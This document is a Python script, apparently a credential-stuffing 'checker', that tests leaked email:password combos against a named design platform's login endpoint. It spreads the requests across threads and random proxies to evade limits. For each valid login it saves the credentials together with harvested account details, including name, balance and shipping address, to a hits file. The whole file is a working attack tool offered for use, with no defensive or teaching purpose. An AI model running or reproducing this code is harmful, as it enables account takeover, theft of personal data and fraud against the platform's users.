import requests
import json
import threading
import random
import time
from parser_kittl import parse_using_re

class Color:
    no_colored = "\033[0m"
    white_bold = "\033[1;37m"
    blue_bold = "\033[1;96m"
    green_bold = "\033[1;92m"
    red_bold = "\033[1;91m"
    yellow_bold = "\033[1;33m"

clear_screen = "\033c"   
content = f"""{Color.red_bold}
  /$$$$$$          /$$                               /$$$$$$$$  /$$     /$$    /$$$$$$    /$$  
 /$$__  $$        | $$                              |_____ $$//$$$$   /$$$$   /$$__  $$ /$$$$  
| $$  \__//$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$      /$$/|_  $$  |_  $$  | $$  \ $$|_  $$  
| $$$$   |____  $$| $$ /$$_____/ /$$__  $$| $$__  $$    /$$/   | $$    | $$  |  $$$$$$/  | $$  
| $$_/    /$$$$$$$| $$| $$      | $$  \ $$| $$  \ $$   /$$/    | $$    | $$   >$$__  $$  | $$  
| $$     /$$__  $$| $$| $$      | $$  | $$| $$  | $$  /$$/     | $$    | $$  | $$  \ $$  | $$  
| $$    |  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$/     /$$$$$$ /$$$$$$|  $$$$$$/ /$$$$$$
|__/     \_______/|__/ \_______/ \______/ |__/  |__/|__/     |______/|______/ \______/ |______/
                                                                                                   
{Color.no_colored}"""
print(clear_screen)
print(content)
time.sleep(5)

proxy = set()
with open("proxies.txt","r", encoding='utf-8') as pfile:
    lines = pfile.readlines()
    for line in lines:
        proxy.add(line.strip())

combo_count = 0

def update_log_file():
    global combo_count  
    with open("log.txt", 'a', encoding='utf-8') as log_file:
        log_file.write(f"Combos Checked: {combo_count+1}\n")


def brutter(user, password, proxies):
    data = {
        "email": user,
        "password": password
    }

    headers = {
        # Custom headers here
    }

    url = "https://api.kittl.com/sessions/create"
    response = requests.post(url, json=data, headers=headers, proxies=proxies)
    if response.status_code == 201:
        content_type = response.headers.get("Content-Type", "")
        if "application/json" in content_type:
            data = response.json()
        else:
            print(f"Unexpected content type: {content_type}")
            return
        update_log_file()
        data = json.dumps(data)

        name = parse_using_re(data, "name")
        followers = parse_using_re(data, "followerCount")
        following = parse_using_re(data, "followingCount")
        balance = parse_using_re(data, "balance")
        designCount = parse_using_re(data, "designsCount")
        createdAt = parse_using_re(data, "createdAt")
        address = parse_using_re(data, "shippingAddress")

        with open("Hits.txt", 'a', encoding='utf-8') as hits:
            hits.write(f"{user}:{password} | Name:{name},Followers:{followers},Following:{following},Balance:{balance},Designs:{designCount},CreatedAt:{createdAt},Address:{address} |")
            hits.write("\n")

        print(f"{Color.yellow_bold}{response.status_code}{Color.no_colored} {Color.green_bold}{user}:{password}{Color.no_colored}")
        
    else:
        print(f"{Color.red_bold}{response.status_code}{Color.no_colored} {Color.blue_bold}{user}:{password}{Color.no_colored}")

def process_combo(combo):
    proxies = {
        'http': 'http://' + random.choice(list(proxy))
    }
    parts = combo.strip().split(":")
    try:
        if len(parts) == 2:
            user = parts[0]
            password = parts[1]
            brutter(user, password, proxies)
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass

if __name__ == "__main__":
    with open("combos.txt", 'r', encoding='utf-8') as combo:
        lines = combo.readlines()
    
    threads = []
    for line in lines:
        thread = threading.Thread(target=process_combo, args=(line,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
